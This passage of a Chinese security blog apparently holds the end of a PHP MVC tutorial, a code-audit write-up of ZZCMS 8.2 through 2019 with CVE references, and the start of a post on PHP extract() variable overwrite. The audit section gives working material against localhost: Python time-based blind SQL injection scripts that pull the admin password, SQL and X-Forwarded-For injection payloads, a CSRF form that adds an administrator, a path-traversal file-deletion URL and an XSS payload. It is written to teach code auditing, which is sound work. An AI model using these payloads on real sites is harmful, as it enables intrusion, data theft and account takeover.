<p>还需要修改控制器的方法根据不同参数取得不同的数据。<br>// controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($param)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'model/model.php'</span>);</span></span><br><span class="line"><span class="php">    $model = <span class="keyword">new</span> Model();</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $data = $model-&gt;getData(<span class="keyword">$this</span>-&gt;$param);</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>访问<br><a href="http://localhost/index.php?c=demo&amp;a=index&amp;param=key" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index&amp;param=key</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1adw90p2nj30ex03ndfz.jpg" alt=""><br>成功~</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.awaimai.com/128.html" target="_blank" rel="noopener">https://www.awaimai.com/128.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/21/PHP-MVC开发框架学习/" data-id="cjvrp4gip000m5gqr1ufim2rp" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-zzcms各版本审计之路" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/17/zzcms各版本审计之路/" class="article-date">
  <time datetime="2019-03-17T15:22:47.000Z" itemprop="datePublished">2019-03-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/17/zzcms各版本审计之路/">zzcms各版本审计之路</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ZZCMS基础"><a href="#ZZCMS基础" class="headerlink" title="ZZCMS基础"></a>ZZCMS基础</h1><p>核心文件：<br>inc/fuction.php  全局函数文件<br>inc/config.php  常量配置文件<br>inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒</p>
<p>在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是判断用户是否登入</p>
<p>adv.php 设置和修改广告词 包括对图片的修改与上传<br>adv2.php抢占广告位<br>zhadd.php  发展会 交给zhsave.php 处理<br>msg_manage.php 管理群发<br>msg.php 进行群发</p>
<p>ZZCMS的数据库<br>zzcms_ad  存储 抢占广告位的 信息<br>zzcms_zh 存储展会所属的用户的有关信息<br>zzcms_zhclass 存储展会的类别<br>zzcms_pp 存储 发布的品牌 及上传的图片的地址<br>zzcms_main  储存招商信息</p>
<h1 id="zzcms-8-2"><a href="#zzcms-8-2" class="headerlink" title="zzcms 8.2"></a>zzcms 8.2</h1><hr>
<p>前言:<br>ZZCMS 8.2可以说是学习代码审计的一个练手cms了 整个cms读通不需要花太多时间 而且本身也包含了很多漏洞 XXS sql注入 任意文件删除等等<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg" alt=""></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><strong>漏洞文件:</strong> /install/step_6.php</p>
<p><strong>漏洞原因:</strong>  没有进行安全过滤</p>
<p><strong>漏洞分析:</strong><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td1upkijj30jy04x74l.jpg" alt=""></p>
<p>在step6这里,会输出$admin $adminpwdtrue 这两个变量的值<br>然后在install/index.php,把数组中的键名直接注册为了变量<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td4pajtsj30ig05mt97.jpg" alt=""><br>通俗来讲就是如果POST一个admin = 1  就会把admin 注册为变量使用 且值为1<br>接着往下看 在switch语句中 如果到了步骤case 6 就会包含step_6.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td9hsy62j30fk02cq2u.jpg" alt=""><br>在安装cms时只是依次判断,接着进行相应的包含,在数据的传递中没有进行安全处理<br><strong>漏洞复现:</strong><br>在/index.php中post相应的step的值会进行相应的文件包含<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdilpjm2j30yu0fqq5h.jpg" alt=""><br>成功触发XSS</p>
<p><strong>漏洞文件:</strong> /zx/show.php</p>
<p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p>
<p><strong>漏洞分析:</strong><br>zx目录是资讯页面 show.php 的功能是显示发布的资讯文章及对此文章进行评论<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0psobmnzrj30oo0ajaaz.jpg" alt=""><br>在23行起 先判断要取得文章id 然后从数据库取出 显示出来 其中 coutent 被取出来然后加入stripfxg()处理<br>跟进stripfxg() 在/inc/stopsqlin.php 其功能是还原被实体化的数据<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdos0hwij30sz03b74o.jpg" alt=""></p>
<p>继续用Seay审计系统在show.php对countent 进行追踪 发现调用showcontent和Payjf等方法,输出到页面上，但是这些方法没有对一些危险字符进行安全处理<br>这就造成了数据在进行实体化存入数据库然后还原成原来的数据没有进行过滤,会导致注入语句被成功执行<br><strong>漏洞复现</strong><br>在注册一个用户test 在发布资讯或者公司新闻 点击源码再发送XSS注入代码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pu8m3y8lj30ug0by75l.jpg" alt=""><br>发布成功之后点击浏览 发现成功触发JS<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pud0oj3fj30z00bkwhn.jpg" alt=""></p>
<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p><strong>漏洞文件:</strong> /user/adv.php,/user/licence_save.php,/user/ppsave.php 等具有文件上传功能的文件</p>
<p><strong>漏洞原因:</strong> <strong>.</strong> 和 <strong>/</strong> 字符没有过滤而导致夸目录删除文件</p>
<p><strong>漏洞分析:</strong><br>在个人中心里面,有很多上传图片的功能及对图片进行修改，这些文件上传功能的代码几乎都没有进行过滤验证,就导致了夸目录删除文件<br>比如在 /user/ppsave.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rv0p9f8xj30jn060t91.jpg" alt=""></p>
<p>这里仅仅只是判断了oldimg 与img 是否相等 不相等就删除oldimg 而且 oldimg 与 img 是通过POST接收,只是trim一下没有进行任何对 . / 等危险字符进行过滤,而且进行伪造 过分相信了用户的输入</p>
<p><strong>漏洞复现:</strong><br>我们在个人中心 随便找一个 可以上传文件的页面 就拿adv.php 这个页面 我们点击修改 然后抓包 修改 oldimg 与img 为了便于测试 我们先建一个test文件夹 然后在里面新建一些文件</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvkyevvrj30q609wgm2.jpg" alt=""></p>
<p>修改oldimg = test/test.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvo68hkij30xl0e8whl.jpg" alt=""></p>
<p>可以看到我们的test.txt 被删除了<br>在ZZcms8.2 版本中上传功能代码几号都是那样写的 这样就导致了很多有上传功能的文件 都是有漏洞的</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>漏洞文件:</strong> /user/adv2.php CVE：CVE-2018-8967</p>
<p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p>
<p><strong>漏洞分析:</strong></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1ezsusdj30xc04e0t9.jpg" alt=""><br>在72行可看到 直接拼接POST进来的值且 没有用引号包裹 这就造成了虽然开头包含了过滤sql注入文件对所有get,post 进行消毒，但是又是直接拼接因为没有用引号包裹,所以不用单引号也可以直接进行sql注入。<br>要想进入这个语句,需要满足 $a+$c &gt;0<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1r2v6ysj30oo0bbwfb.jpg" alt=""><br>即在zzcms_zh或者zzcms_main表查询到有记录</p>
<p><strong>漏洞复现:</strong></p>
<p>先确保  </p>
<ol>
<li>zzcms_zh或者zzcms_main表有数据 不然无法进入执行sql语句</li>
<li>zzcms_ad 表有数据 如果为空时 后面的盲注将不会有任何延迟</li>
</ol>
<p>我们先注册企业用户在个人中心点击抢占广告位(没有可登入后台进行添加) 然后点击抢占这个位置时进行抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r27u4oohj30zh0glacb.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r2b9fd30j310z0ahwg9.jpg" alt=""><br>可以看到 会POST一个id交给adv2.php,接下来构造盲注<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r3grydu9j30zk0lcwhk.jpg" alt=""><br>右下角看到延迟10秒,说明执行成功 POC如下</p>
<pre><code>   import requests
import time

url = &quot;http://127.0.0.1/user/adv2.php?action=modify&quot;
flag = &quot;&quot;
for j in xrange(1,20):
    for i in xrange(31,128):

        payload = &quot;id=1 or if(select ascii(substr(pass,{num},1)) from zzcms_admin) = {index},sleep(5),1)%23&quot;.format(num=j,index=i)

        strart_time = time.time()
        r = requests.post(url,data=payload,headers={&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;})
        end_time = time.time()

        cost = end_time - strart_time
        if cost &gt; 5:
            flag +=chr(i)
            print flag
            break
print &apos;flag is  %s &apos; % flag
</code></pre><p><strong>漏洞文件:</strong> /dl/dl_sendmail.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中 没有进行过滤 使用危险函数stripfxg()<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>此文件是给代理发邮件时会将数据发送给dl_sendmail.php处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rxagjqpzj30vd0b4mym.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5akoqmj30kd03i74f.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5vw7zrj30hj02kdfu.jpg" alt=""><br>从POST接受过来的sql 进行stripfxg()处理然后赋给了session 最后拼接 执行sql语句，且没有用号包裹,在之前就分析分析过这个方法<br>这是将被转义的字符还原 简单来说就是 输入 ‘ 如果经过转义 到数据库会变为 ‘\ 取出来查看是否进过转义 还原为 ‘ 呈现给用户<br>使用了这个危险函数stripfxg() 他可以将全局过滤还原成正常的数据，如果这个数据带入了sql查询中，会直接造成注入的。<br><strong>漏洞复现:</strong><br>进行复现时要保证 zzcms_msg 有数据 且 有个elite 属性值为1<br>点击发邮件 然后抓包 修改sql 内容<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry1bz3waj30zk0lcdj1.jpg" alt=""></p>
<p>这里我用的盲注,可看到成功延迟10秒</p>
<p><strong>漏洞文件:</strong> www/user/del.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>将del.php 放入Seay审计系统可清楚的知道此文件有哪些变量 方便进行审计<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ojmhuoe9j30v10ii40o.jpg" alt=""><br>首先对传入的pagename,tablename 进行了简单去空处理 id 被chekid()函数进行了处理,找到checkid()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0okeij9dcj30o805v3z2.jpg" alt=""><br>对id进行了过滤，接着在switch语句中 sql语句只有对id进行拼接操作 也不存在sql注入  接着往下看 当$tablename不满足if和elseif 的条件的时候,发现我们传入的tablename 直接被拼接到了sql语句当中并且tablename变量也没有用单引号包裹 没有进行任何过滤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0otawhn3tj30ky0440sx.jpg" alt=""><br><strong>漏洞复现:</strong><br>先注册一个账户 test(不用注册登入也是可以进行注入的) 然后点击发公司新闻先发布一条信息，在数据库查看 发现 已经存入数据库当中<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0on1hdm00j30w509jgn1.jpg" alt=""><br>接下来我们再删除这条信息的时候抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0op1fek6sj30kw08g0tf.jpg" alt=""><br>看到  删除的时候会将tablename 发送给del.php 处理 于是构造sql注入<br>post:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>&amp;tablename=zzcms_zx where id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span> and if((ascii(substr(user(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">114</span>),sleep(<span class="number">10</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p>
<p>用union语句 以免因为前面的select 语句为空而注入失败<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0opyuds18j30z50d30uq.jpg" alt=""><br>右下角显示延迟10 秒 说明成功注入<br>这里需要注意 不能用 大于号和小于号 前面已经说过这个cms会在 inc/stopsqlin.php 中 用addslashes()、htmlspecialchars() 对get 和 post 过来的值进行处理<br>POC如下 py2环境下成功运行<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"id=1&amp;tablename=zzcms_zx where id=1 union select 1,2 and if(ascii(substr(database(),&#123;num&#125;,1)) = &#123;index&#125;,sleep(5),1)%23"</span>.format(<span class="built_in">num</span>=j,index=i)</span><br><span class="line"></span><br><span class="line">        strart_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r = requests.post(url,data=payload,headers=&#123;<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;)</span><br><span class="line">        end_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">        cost = end_time - strart_time</span><br><span class="line">        <span class="keyword">if</span> cost &gt; <span class="number">5</span>:</span><br><span class="line">            flag +=chr(i)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> 'flag <span class="built_in">is</span>  <span class="built_in">%s</span> ' <span class="symbol">%</span> flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ote7zwxhj311x0ivgn9.jpg" alt=""></p>
<p><strong>漏洞文件:</strong> /user/check.php<br><strong>漏洞原因:</strong> getip()中没有进行过滤</p>
<p><strong>漏洞分析:</strong><br>check.php 是个检查用户登入状态文件 很多文件都包含此文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz5sguycj30s504adgm.jpg" alt=""><br>这行sql语句调用了getip()来获取ip值,接着看看这个函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz8zgypvj30sq085t9t.jpg" alt=""><br>发现只是单纯的从HTTP直接换取ip值 没有进行过滤 接下来进行XFF注入</p>
<p><strong>漏洞复现:</strong><br>只要包含了check.php 都可以进行XFF注入<br>X-Forwarded-For’:1’or sleep(7)</p>
<h2 id="任意用户密码修改"><a href="#任意用户密码修改" class="headerlink" title="任意用户密码修改"></a>任意用户密码修改</h2><p><strong>漏洞文件:</strong> /one/getpassword.php<br><strong>漏洞分析:</strong><br>getpassword.php 是用来找回密码功能的文件代码<br>通过判断$action的值来进行相应的步骤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbovb4psj30u9042gly.jpg" alt=""><br>在73行起 如果$action=step3 <code>$_SESSION[&#39;username&#39;]</code> 不为空 然后就进行update操作<br><code>$_SESSION[&#39;username&#39;]</code>又是从step1 中 post传递过来的 username，就导致了username可控<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbtwhnfcj30mc06hjs5.jpg" alt=""></p>
<p><strong>漏洞复现:</strong><br>首先第一步 先输入要找回密码的用户名 点击下一步时抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sc9fo7o4j30rv0f9q49.jpg" alt=""><br>这样就有了session值<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scjo9xtlj30j8090gm9.jpg" alt=""></p>
<p>然后将action改为step3 修改POST数据 password的值就是修改的密码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scr3b20cj30z20d076i.jpg" alt=""><br>可以看到 test用户密码修改成功 然后进行登入 登入成功</p>
<h1 id="ZZCMS-8-3"><a href="#ZZCMS-8-3" class="headerlink" title="ZZCMS 8.3"></a>ZZCMS 8.3</h1><p>首先看官网对之前版本的处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4d3irxcj30tt0940tr.jpg" alt=""></p>
<p>虽然更新到8.3 但是还是存在很多 漏洞  有些在8.2存在的漏洞在8.3也没有解决<br>所以很多漏洞在8.2版本也就有了<br>可以看到 <strong>/dl/dl_sendmail.php</strong> 这个sql漏洞在8.3还存在</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>其实这个也在8.2存在,整个CMS管理后台设计操作的表单没有设置token验证，导致了可以进行夸站请求伪造</p>
<p><strong>漏洞复现:</strong><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/test/adminadd.php?action=add"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"groupid"</span> value=<span class="string">"1"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"admins"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs2"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure></p>
<p>如果管理员点击,就会添加管理员用户</p>
<h1 id="ZZCMS-2018"><a href="#ZZCMS-2018" class="headerlink" title="ZZCMS 2018"></a>ZZCMS 2018</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10aywgajbj30hv04qq30.jpg" alt=""></p>
<h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>CVE-2019-8411<br> <strong>漏洞文件</strong> /admin/dl_data.php<br> <strong>漏洞分析</strong><br> 看到这个这个漏洞,我再回过头看8.2和8.3 版本 的源代码 发现原来是早就在8.2存在的漏洞</p>
<p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z6cbmz8gj30lx059dg2.jpg" alt=""></p>
<p> 直接从get获取filename的值 拼接到$fp 也没有用单引号包裹 然后直接进行文件删除</p>
<p> <strong>漏洞复现:</strong></p>
<p> 首先在wwww目录下新建test目录,在test目录下建一个yang.txt文件，然后在浏览器输入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/</span>dl_data.php?action=del&amp;filename=..<span class="regexp">/test/y</span>ang.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10ax6sndqj30z60a0q43.jpg" alt=""><br>发现,yang.txt已经被删除了</p>
<h1 id="zzcms-2019"><a href="#zzcms-2019" class="headerlink" title="zzcms 2019"></a>zzcms 2019</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4uz95rej30ws06i3zc.jpg" alt=""><br>在对2019版本随便测试了一下<br>发现2019版本还是有一部分在8.2存在的XSS漏洞漏洞还没修复</p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>这个存储型xss注入漏洞 是在前不久爆出来的 比cms官网写的最新更新时间晚  说明这个漏洞还没修复,可是当我去官网下载这个cms进行复现时复现不了 发现已经被悄悄修复了 哼~  所以只能讲下原理</p>
<p><strong>漏洞文件</strong> /user/ask.php // 这是个发问答的功能文件<br><strong>漏洞分析</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$do=<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])?$_GET[<span class="string">'do'</span>]:<span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($do) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"add"</span>:add();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"modify"</span>:modify();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>找到modify()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1662802twj30ps0b9myk.jpg" alt=""><br>再跟进markit() 在 /inc/function.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1664mp70aj30zp03n74n.jpg" alt=""></p>
<p>可以看到,这个url 没有进行 过滤 直接插入到了 语句中<br>接下来在url中构造xss代码<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="meta-keyword">/to/</span>zzmcs<span class="meta-keyword">/user/</span>ask.php?do=modify<span class="variable">&amp;page</span>=<span class="number">1</span><span class="variable">&amp;id</span>=<span class="number">1</span><span class="variable">&amp;aaa</span>=<span class="params">&lt;sCrIpT&gt;</span>alert(<span class="meta-keyword">/xss/</span>)<span class="params">&lt;/ScRiPt&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当管理员访问后台查看不良数据时会触发XSS漏洞</p>
<h1 id="代码审计经验"><a href="#代码审计经验" class="headerlink" title="代码审计经验"></a>代码审计经验</h1><p>在分析cms 或者是很长的代码时 用seay 等审计系统进行追踪调试 更方便清晰<br>对用户可控的数据 利用审计系统进行追踪 看看进行了哪些包装过滤,并分析这些函数是否有漏洞可绕过<br>关注 功能代码，配置文件，比如看看过滤sql注入功能的代码 数据库连接时是否出现漏洞<br>分析各类漏洞可能使用的危险函数,寻找这些能够产生漏洞的函数进行分析 比如unlink(),fread(),eval(),preg_replace(),query()等等<br>查看是否存在逻辑漏洞，比如 程序是否可以重复安装 ，修改密码是否存在越权修改其他用户密码，找回密码验证码是否可以暴力破解, 验证存在绕过<br>要学会经常复现 复现会遇到问题 你的问题有可能与别人的不一样 你测试成功payload语句和poc也有可能与别人不一样<br>在进行对某个cms进行审计时 可以去看看这个cms官网的历史更新版本即历史漏洞,</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/17/zzcms各版本审计之路/" data-id="cjvrp4gll002o5gqr59dqscsh" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php-bugs-php代码审计基础" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/16/php-bugs-php代码审计基础/" class="article-date">
  <time datetime="2019-03-16T14:22:57.000Z" itemprop="datePublished">2019-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/16/php-bugs-php代码审计基础/">php_bugs(php代码审计基础)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以下都是以下代码审计的一些基础漏洞,适合新手学习~</p>
<h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract 变量覆盖"></a>extract 变量覆盖</h2><p>extract(array,extract_rules,prefix)<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">    $content=trim(@file_get_contents($flag));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($shiyan==$content)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">   <span class="keyword">else</span></span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>1、文件将get方法传输进来的值通过extrace()函数处理。<br>2、通过两个if语句分别判断是否存在gift变量，和变量gift的值和变量content的值是否相等。变量content的值是通过读取变量test的值获取到的。如果两个变量相等输出flag。如果不相等，输出错误。<br>但是我们并不知道test的值是什么？所以我们使用变量覆盖漏洞，重新给test赋值。</p>
<p>例如：$GET[‘test’]=’a’,被extract（）函数处理后，就变成了$test=’a’,有与之同名的变量$test = ‘‘;，将其值覆盖掉。并且get方法传输的gift参数的值也为a。这样，$gift=$content。就可以获得flag。</p>
